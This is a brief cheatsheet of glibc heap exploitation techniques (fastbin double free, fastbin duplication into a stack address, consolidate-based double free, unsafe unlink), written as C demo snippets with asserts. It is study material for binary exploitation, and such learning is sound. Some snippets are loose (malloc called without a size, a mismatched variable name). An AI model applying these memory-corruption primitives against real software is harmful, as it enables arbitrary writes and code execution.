---
title: "Binex Heap"
description: "Cheatsheet"
date: "2025-8-3"
---
## fastbin_dup
```c
free(a);
// free(a); // would crash here
free(b);
free(a);

c = malloc();
d = malloc();
//heap is allocated and in the bins at the same time
e = malloc();
assert(c == e);
```

## fastbin_dup_into_stack
```c
free(heap);
free(a);
free(heap);
//double free

heap = malloc();
c = malloc();
//heap chunk is allocated and in the bins at the same time

unsigned long stack[4];
stack[1] = 0x20;

heap[0] = (heap >> 12) ^ &stack[2]; //control the next pointer to point to stack variable

heap = malloc(); // HEAD pointer points to stack variable

vuln = malloc(); // get the stack allocation

assert(vuln == &stack_var[2]);
```

## fastbin_dup_consolidate (idk)
```c
#define CHUNK_SIZE 0x400
//---
void *ptr[7];

void *p1 = malloc(0x40);

free(p1); // to fastbin

void *p2 = malloc(CHUNK_SIZE); // trigger consolidate
assert(p1 == p2);

free(p1); // vulnerability (double free)

void *p3 = malloc(CHUNK_SIZE);

assert(p3 == p2);
```
## unsafe_unlink
```c
int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
int header_size = 2;

chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

//fake free chunk inside chunk0
chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; //prev_size
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); //fd points to stack
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); //bk points to stack

uint64_t *chunk1_hdr = chunk1_ptr - header_size; //get chunk1 header
chunk1_hdr[0] = malloc_size; //prev_size
chunk1_hdr[1] &= ~1; //clear inuse bit
free(chunk1_ptr); // then, chunk0_ptr no longer points to heap

// unlink in the background
// chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2)
// chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
// yes, its overwritten twice

char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string; // chunk0_ptr = victim_string

chunk0_ptr[0] = 0x4141414142424242LL;
assert(*(long *)victim_string == 0x4141414142424242L);
```
